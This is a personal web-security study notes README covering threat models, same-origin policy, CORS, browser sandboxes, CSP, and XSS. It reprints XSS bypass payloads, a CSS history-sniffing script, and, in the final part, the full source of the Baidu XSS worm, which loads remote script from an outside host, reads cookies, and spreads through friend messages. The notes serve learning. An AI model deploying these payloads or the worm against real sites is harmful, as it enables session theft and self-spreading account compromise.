# Web-Security
A series of experiments for inhancing the intuitive understanding of some knowledge. Mainly for personal use.  
It should be noted that the content of this project is only for learning purposes. Do not use it for illegal purposes; otherwise, the consequences will be borne by yourself.  

## Three Key Elements
+ Confidentiality (Encode and Decode)  
+ Integrity (Digital signature)  
+ Availability( Distributed System )  

## What is Security Assessment ?
Security Assessment consists of four steps:
+ Assets Classification 
+ Threat Analysis : Find all possible threats , attack surface(such as ***STRIDE MODEL***)
+ Risk Analysis : Risk = Probability * Damage Potential (such as ***DREAD MODEL***)
+ Security Solution : Effectively solve problems; Good user experience; ***Low coupling***; Easy to expand and upgrade

### Why need low coupling?
Low coupling is a concept from software design that emphasizes minimizing dependencies between different components , modules, or classes in a system . 
It ensures that changes to one part of the system have minimal impact on other parts.  
For example, in a web application, if a PaymentProcessor class directly depends on a specific Database Connection class, so that change database would require rewriting the PaymentProcessor class, this is the drawback of high coupling.  

### What is STRIDE MODEL?
This model is developed by Microsoft researchers in 1999.
+ Spoofing: Impersonate others identity ( Authentification )
+ Tampering: Modify data or code( Integrity )
+ Reputation : Deny what has been done( Non-reputation )
+ Information Disclosure ( Confidentiality )
+ Denial of Service ( Availability )
+ Elevation of Privilege ( Authorization )  
> Difference : Authentication & Authorization 
Authentication verifies who you are ( a user, device, or system ) through username/password login or biometric verification( fingerprint , facial recognition ) or multi-factor Authentication(e.g. SMS code + password)  
Authorization determines what you can assess, that is grants or restricts permissions to resources  after Authentication. For example, grant read-only access to a database for certain roles, allow an admin to delete files but restrict regular users  

### What is DREAD MODEL?
This model is also developed by Microsoft.  
| Level | Low | Medium | High |
| ------ | ------ | ------| ------ |
|Damage Potential : How severe the impact would be if the threat is exploited|Leak simple information|Leak sensitive information|Full verification  permission; Perform administrator operations; Illegally upload files, etc.
Reproducibility: How easily the threat can be reproduced|Require rare conditions or insider access, that is hard to repeat the attack process again|Could repeat, but time limitations|Attack can be reliably repeated
Exploitatability: The effort or skill required to exploit the vulnerability|Require advanced skills or physical access|Only attackers with some skills could exploit|Beginners like script kiddie could exploit via tools in a short time
Affected Users : The scale of users or systems impacted|Very few users, anonymous users, or non-essential systems|Part of users without default configuration|All users with default configuration, key users, or critical infrastructure
Discoverability: How easily the vulnerability could be found|Require deep system knowledge to detect, that is hard to find|In private area, some people could see it and need to dig deeper into the vulnerability|Visible in public APIs or error message

> **Example**  
Threat: SQL Injection in a login page  
Damage Potential : 3(Data theft possible )  
Reproducibility: 3(Exploit code is public )  
Exploitability: 3 (Simple tools)  
Affected Users : 3 (All users)  
Discoverability: 2 (Visible in error logs)  
Total score: 14/15，critical priority  

## Security Principles
### Security By Default
Blacklist + Whitelist  
Minimal Privilege : Grant necessary Privilege to the user  
### Defense in Depth 
Different layers achieve different solutions  
Do the right thing at the right place  
> **Example: UTM(Unified Threat Management )**  
UTM is an integrated solution that combines multiple features into a single platform or application to protect networks from a wide range of threats, particularly suited for small to medium-sized businesses (SMBs).  
It acts as a centralized gateway, inspecting all network traffic and applying layered security policies. However, it does not follow defense in depth principle.  
### Data and Code Separation 
Defend against SQL Injection , CRLF, X-Path, XSS, Buffer Overflow ,etc. 
### Unpredictability
For Web application, unpredictablility could be used to defend against:
+ Web crawlers/Spiders(id=1,2，3...)
+ CSRF(e.g., randomized token)

Most use techniques include: hash function, encode/decode functions, and randomized functions.  
> **Example:** 
Microsoft Windows have vulnerability of buffer overflow attacks or ***return-oriented programming (ROP) attacks***, which always rely on knowing exact memory addresses of target functions or data.

#### What is return oriented programming attack?
##### Data Execution Prevention(DEP)
For memory protection, DEP designates portion of memory (e.g. stack, heap ) as non-executable. If a program or script tries to execute code from these protected areas, DEP terminates the process at once.  
Hardware-enforced DEP: Relies on a processor 's NX bit(No Execute Bit), requiring compatible CPUs that most modern processors could support.  
Software-enforced DEP  
##### Address Space Layout Randomization(ASLR)
Randomizing memory locations where critical system and application components are loaded, such as executables, libraries, heap, and stack. So that attackers can not reliably predict where to inject malicious code or hijack execution flow.

## Browser Security
### Same Origin Policy (SOP)
It restricts how web pages or scripts from one origin can interact with resources from another origin.  
Mitigate Attacks : Block malicious scripts from accessing cookies, DOM elements, or API responses from another origin. Thwart cross-site scripting(XSS) and cross-site request forgery(CSRF) by isolating  origins.  

#### What is Same Origin?[^1] 
Two URLs are considered as same origin only if they match in:
+ Protocol 
+ Domain Name 
+ Port
> **Example**  
http://test.com/dir/index.html  
http://test.com/dir2/index.html (Same Origin, only path differs)  
https://test.com/dir/index.html (Different Origin, protocol differs)  
http://test.com:81/dir/index.html (Different Origin, port differs)  
http://test.org/dir/index.html (Different Origin, domain name differs)  

#### What is Inheritance of Origin?
If the script is executed by current URL, it will inherit the origin of this URL.  
```
about:blank
javascript:;
```
[Test Experiment: InheritanceOfOrigin](https://github.com/dark-pool/Web-Security/tree/main/Test%20Experiment/InheritanceOfOrigin)  
![Result](https://github.com/dark-pool/Web-Security/blob/main/Test%20Experiment/InheritanceOfOrigin/Output/67tool-2025-04-24%2022_21_33.png)

From the result, we know that these two methods both can create a blank document that inherits the origin of the parent page. But there are two things need to pay attention :  
When using about:blank to open a blank page, new page' s origin is set as null, until load specific content in the new page. This is because the browser considers the new blank page as an opaque origin, and the behaviors may differ due to browser or version.  
Most modern browser restricts javascript: method to open a blank page.  

#### What is JSONP(JSON with Padding)?


#### What is Cross-Origin Resource Sharing(CORS)?[^2] 
CORS is a W3C standard that allows servers to inform browsers which sources can access the resources by sending additional HTTP header fields.  
For server, configure CORS response header field  :
// Access-Control-Allow-Origin: Indicates whether the response can be shared with requesting code from the given origin
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: <origin>
Access-Control-Allow-Origin: null

// Access-Control-Allow-Headers
// Access-Control-Allow-Credentials: 
// Access-Control-Allow-Methods
// Access-Control-Max-Age
For browser, when sending a cross-origin request, it would automatically add the origin header field to inform the server. Then the browser decides whether to allow cross-origin access based on CORS response header from server. (How it works? Simple Request & Complex Request)
Implementing request headers for setting up CORS depends on the language and framework of the backend. For example, if using Express, so can use CORS middleware with all default configuration.
Simple Request  
A request is classified as simple if it meets all the following criteria :
HTTP Method: GET/POST/HEAD
Headers: Contain only safe-listed headers, including : Accept, Accept-Language, Content-Language, Content-Type limited to:text/plain, multipart/form-data, application/x-www-form-urlencoded 
No Event Listeners(e.g. UploadProgress to the request object)
Browsers send requests directly and check the Access-Control-Allow-Origin response header, and do not require pre-inspection.

添加图片注释，不超过 140 字（可选）
Complex Request
A request is classified as complex if it violates any of the simple request conditions.
HTTP Method: PUT/DELETE/PATCH/CONNECT/OPTIONS/TRACE(non-simple methods )
Headers: Include custom headers(e.g. Authorization,X-Custom-Header) or non-standard Content-Type(e.g. application/json)
Other Features: Require credentials (e.g., withCredentials: true in JavaScript ), Uses advanced features like event listeners for request monitoring
Preflight Request: When a complex request is detected, the browser will automatically sends an OPTIONS preflight request to validate server permissions before sending the actual request.
In preflight request and responses headers, 
Access-Control-Request-Method: Specifies the intended HTTP method (e.g., PUT).
Access-Control-Request-Headers: Lists custom headers (e.g., Authorization).

添加图片注释，不超过 140 字（可选）

添加图片注释，不超过 140 字（可选）

Allowing resource loading (e.g., images, CSS) by default but restricting active manipulation (e.g., modifying cross-origin iframes)
Cross-origin Embedding Resources 
<script src="">: load and execute JavaScript file 
<link href="">: load CSS style sheet 
<img>/<video>/<audio>: load images/videos/audios
<object>/<embed>/<applet>: load Java Applets, Flash, PDF, etc. 
<iframe>: load any resources, such as whole web page or application, but could set X-Frame-Options header to prohibit
@font-size: load font
Cross-origin Writes
Form Submissins 
Cross-origin Reads 

What are Third-Party Plugins Same Origin Policy?
Flash
crossdomain.xml 
The following configuration allows onlytrusted-partner.comover HTTPS and permits theX-API-Keyheader:
<cross-domain-policy>  
  <site-control permitted-cross-domain-policies="by-content-only"/>  
  <allow-access-from domain="trusted-partner.com" secure="true"/>  
  <allow-http-request-headers-from domain="trusted-partner.com" headers="X-API-Key"/>  
</cross-domain-policy>  

https://www.qq.com/crossdomain.xml
Browser Sandbox 
It is a "virtual cage" that isolates web content(e.g., tabs, plugins, scripts) from operating system and hardware by restricting untrusted code from accessing sensitive resources.
How it works?
Isolation
The browser runs web content in a restricted environment(sandbox environment) with limited permissions, even if malicious code runs, it can not escape the sandbox to modify files or install software, or spy on data.

Process Separation

Multi-threads Within each process
Main thread
Compositor thread
Raster thread
I/O thread
Web Workers
Service Workers
Example: Google Chrome 
Per-Tab Sandbox : Multi-process Isolation : Each tab, extension, and plugin as a separate process with its own memory space and restricted OS access , so that prevents a single crashing tab from bringing down the entire browser.
OS Integrity: On Windows, Chrome uses Job Objects and Win32k Lockdown to block system calls; On Linux/MacOS, it leverages namespaces and seccomp-bpf to limit resource access.
Renderer Process Restrictions and GPU Sandbox: Blink Engine can not directly access the network or file system, or execute system commands or modify registry settings.

添加图片注释，不超过 140 字（可选）
Example: Internet Explorer(IE)
IE sandbox approach is less robust compared to Chrome.
Single-process model: Older IE versions(pre-IE9) run all tabs in one process.
Protected Mode: In IE 7 and later version, protected mode runs browser in a low-privilege environment , and restricted from writing sensitive locations(e.g., user profile folders, Program Files)
Plugins like Flash often bypass the sandbox

添加图片注释，不超过 140 字（可选）
Malicious URL Interception
What is Malicious URL?
Webpage Hijacking/Malware Planting
Injecting harmful code or scripts into a legitimate website or online platform. When users visit the compromised site, the hidden code automatically executes, which leading to:
Malware Downloads: such as viruses, ransomware, or spyware onto victims device
Phishing: Redirecting users to fake pages to get personal details, such as login credentials or financial data
Botnet Recruitment: Enlisting devices into a network for large-scale attacks
How it works?
Example: Google Chrome
Blacklist-based Filter: Maintains dynamic blacklists of malicious URLs, updated every 30-60 minutes. Including Phishing domains, Malware-hosting sites, Social engineering scams. 
Real-Time URL Check: When visit a URL, Chrome sends a hashed version of address to Google's Safe Browsing API to verify its safety. SafeBrowsing API can be used by public.
Machine Learning about Behavior Analysis: Detect suspicious patterns, such as newly registered domains mimicking legitimate sites.
PhishTank  is one of the organizations offer free blacklist of malicious websites, which are provided by volunteers from all around the world.

添加图片注释，不超过 140 字（可选）
Extended Validation SSL Certificate(EV SSL)
It is the highest level of SSL/TLS certificate for website, usually seen in banks, e-commerce, and payment processors(e.g., PayPal, Amazon).
When a site has EV SSL, browser shows a green padlock + company name in URL bar.

添加图片注释，不超过 140 字（可选）
XSS Filter/XSS Auditor/Content Security Policy(CSP)
IE 8 is the first browser to have a built-in XSS Filter in 2009., and it is based on Regex heuristics.
{(v|(&[#()\[\].]x?0*((86)|(56)|(118)|(76));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(b|(&[#()\[\].]x?0*((66)|(42)|(98)|(62));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(s|(&[#()\[\].]x?0*((83)|(53)|(115)|(73));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(c|(&[#()\[\].]x?0*((67)|(43)|(99)|(63));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*{(r|(&[#()\[\].]x?0*((82)|(52)|(114)|(72));?))}([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(i|(&[#()\[\].]x?0*((73)|(49)|(105)|(69));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(p|(&[#()\[\].]x?0*((80)|(50)|(112)|(70));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(t|(&[#()\[\].]x?0*((84)|(54)|(116)|(74));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(:|(&[#()\[\].]x?0*((58)|(3A));?)).}

{(j|(&[#()\[\].]x?0*((74)|(4A)|(106)|(6A));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(a|(&[#()\[\].]x?0*((65)|(41)|(97)|(61));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(v|(&[#()\[\].]x?0*((86)|(56)|(118)|(76));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(a|(&[#()\[\].]x?0*((65)|(41)|(97)|(61));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(s|(&[#()\[\].]x?0*((83)|(53)|(115)|(73));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(c|(&[#()\[\].]x?0*((67)|(43)|(99)|(63));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*{(r|(&[#()\[\].]x?0*((82)|(52)|(114)|(72));?))}([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(i|(&[#()\[\].]x?0*((73)|(49)|(105)|(69));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(p|(&[#()\[\].]x?0*((80)|(50)|(112)|(70));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(t|(&[#()\[\].]x?0*((84)|(54)|(116)|(74));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(:|(&[#()\[\].]x?0*((58)|(3A));?)).}

{<st{y}le.*?>.*?((@[i\\])|(([:=]|(&[#()\[\].]x?0*((58)|(3A)|(61)|(3D));?)).*?([(\\]|(&[#()\[\].]x?0*((40)|(28)|(92)|(5C));?))))}

{[ /+\t\"\'&#x60;]st{y}le[ /+\t]*?=.*?([:=]|(&[#()\[\].]x?0*((58)|(3A)|(61)|(3D));?)).*?([(\\]|(&[#()\[\].]x?0*((40)|(28)|(92)|(5C));?))}

{<OB{J}ECT[ /+\t].*?((type)|(codetype)|(classid)|(code)|(data))[ /+\t]*=}

{<AP{P}LET[ /+\t].*?code[ /+\t]*=}

{[ /+\t\"\'&#x60;]data{s}rc[ +\t]*?=.}

{<BA{S}E[ /+\t].*?href[ /+\t]*=}

{<LI{N}K[ /+\t].*?href[ /+\t]*=}

{<ME{T}A[ /+\t].*?http-equiv[ /+\t]*=}

{<\?im{p}ort[ /+\t].*?implementation[ /+\t]*=}

{<EM{B}ED[ /+\t].*?SRC.*?=}

{[ /+\t\"\'&#x60;]{o}n\c\c\c+?[ +\t]*?=.}

{<.*[:]vmlf{r}ame.*?[ /+\t]*?src[ /+\t]*=}

{<[i]?f{r}ame.*?[ /+\t]*?src[ /+\t]*=}

{<is{i}ndex[ /+\t>]}

{<fo{r}m.*?>}

{<sc{r}ipt.*?[ /+\t]*?src[ /+\t]*=}

{<sc{r}ipt.*?>}

{[\"\'][ ]*(([^a-z0-9~_:\'\" ])|(in)).*?(((l|(\\u006C))(o|(\\u006F))({c}|(\\u00{6}3))(a|(\\u0061))(t|(\\u0074))(i|(\\u0069))(o|(\\u006F))(n|(\\u006E)))|((n|(\\u006E))(a|(\\u0061))({m}|(\\u00{6}D))(e|(\\u0065)))).*?=}

{[\"\'][ ]*(([^a-z0-9~_:\'\" ])|(in)).+?{[\[]}.*?{[\]]}.*?=}

{[\"\'][ ]*(([^a-z0-9~_:\'\" ])|(in)).+?{[.]}.+?=}

{[\"\'].*?{\)}[ ]*(([^a-z0-9~_:\'\" ])|(in)).+?{\(}}

{[\"\'][ ]*(([^a-z0-9~_:\'\" ])|(in)).+?{\().*?{\}}}

Chrome has adopted in 2010 as XSS Auditor, but now most modern browsers prefer advanced DOM/JS analysis + CSP policies.
Content Security Policy(CSP)
A CSP is defined using a set of directives(rules) specified in an HTTP header or a <meta> tag.
Each directive restricts a type of resources(e.g., scripts, images) to specific allowed sources (e.g., domains, self, none)
Example:
Content-Security-Policy:  
  default-src 'self';  
  script-src 'self' https://trusted-cdn.com;  
  style-src 'self' 'unsafe-inline';  
  img-src *;  
  report-uri /csp-report-endpoint;  
Load most resources (default) only from the site’s own domain ('self').
Allow scripts from 'self' and https://trusted-cdn.com.
Allow inline styles ('unsafe-inline') for CSS.
Allow images from any domain (*).
Report violations to /csp-report-endpoint.
Malformed URL
IE 
www.google.com\abc => www.google.com/abc
www.google.com?abc => www.google.com/?abc
Google Chrome
www.google.com\abc => www.google.com/abc
www.google.com?abc => www.google.com/?abc
FireFox
www.google.com\abc => can not open
www.google.com?abc => www.google.com/?abc
[http://www.cnn.com]
[http://]www.cnn.com
[http://www].cnn.com
……
Cross Site Script(XSS)
XSS Classification 
Reflected XSS/Non-persistent XSS
The user input is displayed on  the page but without being stored, so need to send victims a URL containing the payload.

添加图片注释，不超过 140 字（可选）

添加图片注释，不超过 140 字（可选）
DOM Based XSS is a special type of reflected XSS, but user input is directly shown in the browser and completely processed on the client-side, without reaching the back-end server.

添加图片注释，不超过 140 字（可选）

添加图片注释，不超过 140 字（可选）
Stored XSS/Persistent XSS
The user input is stored on the back-end database, always happened in comments page.

添加图片注释，不超过 140 字（可选）
Example: Stored XSS attack + Cookie Theft

添加图片注释，不超过 140 字（可选）
Example: QQ mail list & content

添加图片注释，不超过 140 字（可选）
Example: 
Completely Automated Public Turing test to tell Computers and Humans Apart (CAPTCHA)
JavaScript Development Framework XSS Vulnerability
Dojo

How to make a XSS code/bypass?
Character Encoding

Length Limitation
// Example
// XSS Vulnerability
<input type=text value="$var" />

// Simpe XSS code
"><script>alert(1)</script>
<input type=text value=""><script>alert(1)</script>" />

// However, $var limitation of length is 20, so:
"><script> alert(1)</
First Method: Event
// 20 characters
" onclick=alert(1)//
<input type=text value="" onclick=alert(1)// "/>
Second Method: Hide and Load XSS Payload somewhere

// 40 characters
" onclick="eval(location.hash.substr(1))
<input type="text" value="" onclick="eval(location.hash.substr(1)) " />

What can XSS do?
Identification of User Browser
alert(navigator.userAgent)

添加图片注释，不超过 140 字（可选）
Gareth Heyes 
<pre lang="javascript"> B=(function x(){})[-5]=='x'?'FF3':(function x(){})[-6]=='x'?'FF2':/a/[-1]=='a'?'FF':'\v'=='v'?'IE':/a/.__proto__=='//'?'Saf':/s/.test(/a/.toString)?'Chr':/^function \(/.test([].sort)?'Op':'Unknown' </pre>
However, this method is not working for most modern browsers.
Identification of Installed Software 
CSS History Hack 
<script> 
  <!--
    /*
NAME: JavaScript History Thief
AUTHOR: Jeremiah Grossman

BSD LICENSE:
Copyright (c) 2006, WhiteHat Security, Inc.
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice,
this list of conditions and the following disclaimer.
* Redistributions in binary form must reproduce the above copyright notice,
this list of conditions and the following disclaimer in the documentation
and/or other materials provided with the distribution.
* Neither the name of the WhiteHat Security nor the names of its contributors
may be used to endorse or promote products derived from this software
without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF
THE POSSIBILITY OF SUCH DAMAGE.
*/


    /* A short list of websites to loop through checking to see if the victim has been there. Without noticable performance overhead, testing couple of a couple thousand URL's is possible within a few seconds. */
    var websites = [
      "http://ha.ckers.org/blog/",
      "http://login.yahoo.com/",
      "http://mail.google.com/",
      "http://mail.yahoo.com/",
      "http://my.yahoo.com/",
      "http://sla.ckers.org/forum/",
      "http://slashdot.org/",
      "http://www.amazon.com/",
      "http://www.aol.com/",
      "http://www.apple.com/",
      "http://www.bankofamerica.com/",
      "http://www.bankone.com/",
      "http://www.blackhat.com/",
      "http://www.blogger.com/",
      "http://www.bofa.com/",
      "http://www.capitalone.com/",
      "http://www.cgisecurity.com/",
      "http://www.chase.com/",
      "http://www.citibank.com/",
      "http://www.cnn.com/",
      "http://www.comerica.com/",
      "http://www.e-gold.com/",
      "http://www.ebay.com/",
      "http://www.etrade.com/",
      "http://www.flickr.com/",
      "http://www.google.com/",
      "http://www.hsbc.com/",
      "http://www.icq.com/",
      "http://www.live.com/",
      "http://www.microsoft.com/",
      "http://www.microsoft.com/en/us/default.aspx",
      "http://www.msn.com/",
      "http://www.myspace.com/",
      "http://www.passport.net/",
      "http://www.paypal.com/",
      "http://www.rsaconference.com/2007/US/",
      "http://www.salesforce.com/",
      "http://www.sourceforge.net/",
      "http://www.statefarm.com/",
      "http://www.usbank.com/",
      "http://www.wachovia.com/",
      "http://www.wamu.com/",
      "http://www.wellsfargo.com/",
      "http://www.whitehatsec.com/home/index.html",
      "http://www.wikipedia.org/",
      "http://www.xanga.com/",
      "http://www.yahoo.com/",
      "http://www2.blogger.com/home",
      "https://banking.wellsfargo.com/",
      "https://commerce.blackhat.com/",


    ];

  /* Loop through each URL */
  for (var i = 0; i < websites.length; i++) {

    /* create the new anchor tag with the appropriate URL information */
    var link = document.createElement("a");
    link.id = "id" + i;
    link.href = websites[i];
    link.innerHTML = websites[i];

    /* create a custom style tag for the specific link. Set the CSS visited selector to a known value, in this case red */
    document.write('<style>');
    document.write('#id' + i + ":visited {color: #FF0000;}");
    document.write('</style>');

    /* quickly add and remove the link from the DOM with enough time to save the visible computed color. */
    document.body.appendChild(link);
    var color = document.defaultView.getComputedStyle(link,null).getPropertyValue("color");
    document.body.removeChild(link);

    /* check to see if the link has been visited if the computed color is red */
    if (color == "rgb(255, 0, 0)") { // visited

      /* add the link to the visited list */
      var item = document.createElement('li');
      item.appendChild(link);
      document.getElementById('visited').appendChild(item);

    } else { // not visited

      /* add the link to the not visited list */
      var item = document.createElement('li');
      item.appendChild(link);
      document.getElementById('notvisited').appendChild(item);

    } // end visited color check if

  } // end URL loop
  // -->
</script> 

添加图片注释，不超过 140 字（可选）
However, Firefox has fixed this issue in 2010, so this kind of information leakage problem is not existent in Mozilla browser.
XSS Big Event
Samy Worm   
It exploited an XSS flaw in MySpace in 2005, adding the text "Samy is my hero" to inflected profiles and automatically sending friend requests to Samy' s account, which spread to over 1 million users under 24 hours. 

Baidu XSS Worm
window.onerror = killErrors;
execScript(unescape('Function%20URLEncoding%28vstrIn%29%0A%20%20%20%20strReturn%20%3D%20%22%22%0A%20%20%20%20For%20aaaa%20%3D%201%20To%20Len%28vstrIn%29%0A%20%20%20%20%20%20%20%20ThisChr%20%3D%20Mid%28vStrIn%2Caaaa%2C1%29%0A%20%20%20%20%20%20%20%20If%20Abs%28Asc%28ThisChr%29%29%20%3C%20%26HFF%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20strReturn%20%3D%20strReturn%20%26%20ThisChr%0A%20%20%20%20%20%20%20%20Else%0A%20%20%20%20%20%20%20%20%20%20%20%20innerCode%20%3D%20Asc%28ThisChr%29%0A%20%20%20%20%20%20%20%20%20%20%20%20If%20innerCode%20%3C%200%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20innerCode%20%3D%20innerCode%20+%20%26H10000%0A%20%20%20%20%20%20%20%20%20%20%20%20End%20If%0A%20%20%20%20%20%20%20%20%20%20%20%20Hight8%20%3D%20%28innerCode%20%20And%20%26HFF00%29%5C%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20Low8%20%3D%20innerCode%20And%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20strReturn%20%3D%20strReturn%20%26%20%22%25%22%20%26%20Hex%28Hight8%29%20%26%20%20%22%25%22%20%26%20Hex%28Low8%29%0A%20%20%20%20%20%20%20%20End%20If%0A%20%20%20%20Next%0A%20%20%20%20URLEncoding%20%3D%20strReturn%0AEnd%20Function'),'VBScript');
cookie='';
cookieval=document.cookie;
spaceid=spaceurl;
myhibaidu="http://hi.baidu.com"+spaceid;
xmlhttp=poster();
debug=0;

online();

if(spaceid!='/') {
  if(debug==1) {
    goteditcss();
    document.cookie='xssshell/owned/you!';
  }
  if(cookieval.indexOf('xssshell')==-1) {
    goteditcss();
    document.cookie='xssshell/owned/you!';
  }
}

function makeevilcss(spaceid,editurl,use){
  playload="a{evilmask:ex/*exp/**/ression*/pression(execScript(unescape('d%253D%2522doc%2522%252B%2522ument%2522%253B%250D%250Ai%253D%2522function%2520load%2528%2529%257Bvar%2520x%253D%2522%252Bd%252B%2522.createElement%2528%2527SCRIPT%2527%2529%253Bx.src%253D%2527http%253A//www.18688.com/cache/1.js%2527%253Bx.defer%253Dtrue%253B%2522%252Bd%252B%2522.getElementsByTagName%2528%2527HEAD%2527%2529%255B0%255D.appendChild%2528x%2529%257D%253Bfunction%2520inject%2528%2529%257Bwindow.setTimeout%2528%2527load%2528%2529%2527%252C1000%2529%257D%253Bif%2528window.x%2521%253D1%2529%257Bwindow.x%253D1%253Binject%2528%2529%257D%253B%2522%250D%250AexecScript%2528i%2529')))}";
  action=myhibaidu+"/commit";
  spCssUse=use;
  s=getmydata(editurl);

  re = /\<input type=\"hidden\" id=\"ct\" name=\"ct\" value=\"(.*?)\"/i;
  ct = s.match(re);
  ct=(ct[1]);

  re = /\<input type=\"hidden\" id=\"cm\" name=\"cm\" value=\"(.*?)\"/i;
  cm = s.match(re);
  cm=(cm[1])/1+1;

  re = /\<input type=\"hidden\" id=\"spCssID\" name=\"spCssID\" value=\"(.*?)\"/i;
  spCssID = s.match(re);
  spCssID=(spCssID[1]);

  spRefUrl=editurl;

  re = /\<textarea(.*?)\>([^\x00]*?)\<\/textarea\>/i;
  spCssText = s.match(re);
  spCssText=spCssText[2];
  spCssText=URLEncoding(spCssText);

  if(spCssText.indexOf('evilmask')!==-1) {
    return 1;
  }
  else spCssText=spCssText+"\r\n\r\n"+playload;

  re = /\<input name=\"spCssName\"(.*?)value=\"(.*?)\">/i;
  spCssName = s.match(re);
  spCssName=spCssName[2];

  re = /\<input name=\"spCssTag\"(.*?)value=\"(.*?)\">/i;
  spCssTag = s.match(re);
  spCssTag=spCssTag[2];

  postdata="ct="+ct+"&spCssUse=1"+"&spCssColorID=1"+"&spCssLayoutID=-1"+"&spRefURL="+URLEncoding(spRefUrl)+"&spRefURL="+URLEncoding(spRefUrl)+"&cm="+cm+"&spCssID="+spCssID+"&spCssText="+spCssText+"&spCssName="+URLEncoding(spCssName)+"&spCssTag="+URLEncoding(spCssTag);
  result=postmydata(action,postdata);
  sendfriendmsg();
  count();
  hack();
}

function goteditcss() {
  src="http://hi.baidu.com"+spaceid+"/modify/spcrtempl/0";
  s=getmydata(src);
  re = /\<link rel=\"stylesheet\" type=\"text\/css\" href=\"(.*?)\/css\/item\/(.*?)\.css\">/i;
  r = s.match(re);
  nowuse=r[2];
  makeevilcss(spaceid,"http://hi.baidu.com"+spaceid+"/modify/spcss/"+nowuse+".css/edit",1);
  return 0;
}

function poster(){
  var request = false;
  if(window.XMLHttpRequest) {
    request = new XMLHttpRequest();
    if(request.overrideMimeType) {
      request.overrideMimeType('text/xml');
    }
  } else if(window.ActiveXObject) {
    var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
    for(var i=0; i<versions.length; i++) {
      try {
        request = new ActiveXObject(versions[i]);
      } catch(e) {}
    }
  }
  return request;
}

function postmydata(action,data){
  xmlhttp.open("POST", action, false);
  xmlhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xmlhttp.send(data);
  return xmlhttp.responseText;
}

function getmydata(action){
  xmlhttp.open("GET", action, false);
  xmlhttp.send();
  return xmlhttp.responseText;
}

function killErrors() {
  return true;
}

function count() {
  a=new Image();
  a.src='http://img.users.51.la/1563171.asp';
  return 0;
}

function online() {
  online=new Image();
  online.src='http://img.users.51.la/1563833.asp ';
  return 0;
}

function hack() {
  return 0;
}

function sendfriendmsg(){
  myfurl=myhibaidu+"/friends";
  s=getmydata(myfurl);
  evilmsg="哈，节日快乐呀!热烈庆祝2008，心情好好，记得要想我呀！\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n"+myhibaidu;

  var D=function(A,B){A[A.length]=B;};
  re = /(.+)D\(k\,\[([^\]]+?)\]\)(.*)/g;
  friends = s.match(re);
  eval(friends[0]);
  for(i in k) {
    eval('msgimg'+i+'=new Image();');
    eval('msgimg'+i+'.src="http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn="+URLEncoding(k[i][2])+"&co="+URLEncoding(evilmsg)+"&vcodeinput=";');
  }
}
function onlinemsg(){ 
  doit=Math.floor(Math.random() * (600 + 1)); 
  if(doit>500) { 
    evilonlinemsg="哈哈,还记得我不,加个友情链接吧?\r\n\r\n\r\n我的地址是"+myhibaidu; 
    xmlDoc=new ActiveXObject("Microsoft.XMLDOM"); 
    xmlDoc.async=false; 
    xmlDoc.load("http://hi.baidu.com/sys/file/moreonline.xml"); 
    online=xmlDoc.documentElement; 
    users=online.getElementsByTagName("id"); 
    x=Math.floor(Math.random() * (200 + 1)); 
    eval('msgimg'+x+'=new Image();'); 
